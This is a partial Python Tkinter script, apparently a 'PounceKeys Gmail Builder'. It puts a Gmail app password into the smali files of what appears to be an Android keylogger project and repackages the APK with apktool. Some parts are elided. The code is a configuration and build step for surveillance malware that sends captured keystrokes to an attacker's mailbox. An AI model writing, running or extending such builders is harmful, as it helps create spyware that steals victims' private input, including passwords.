...
def replace_values():
    ...
    if os.path.exists(current_directory):
        for root, dirs, files in os.walk(current_directory):
            for file in files:
                if file.endswith(".smali"):
                    ...
                    content = content.replace("APP-PASS", app_password)
        ...
        apktool_command = f"java -jar {os.path.join(apktool_directory, 'apktool.jar')} b {os.path.join(apktool_directory, 'PounceKeys-Gmail')}"
        ...
        dist_directory = os.path.join(apktool_directory, "PounceKeys-Gmail", "dist")
...
window = tk.Tk()
window.title("PounceKeys Gmail Builder")
window.configure(bg="black")

# Create input fields with purple text
tk.Label(window, text="Gmail:", fg="purple", bg="black").pack()
gmail_entry = tk.Entry(window)
gmail_entry.pack()

tk.Label(window, text="App Password:", fg="purple", bg="black").pack()
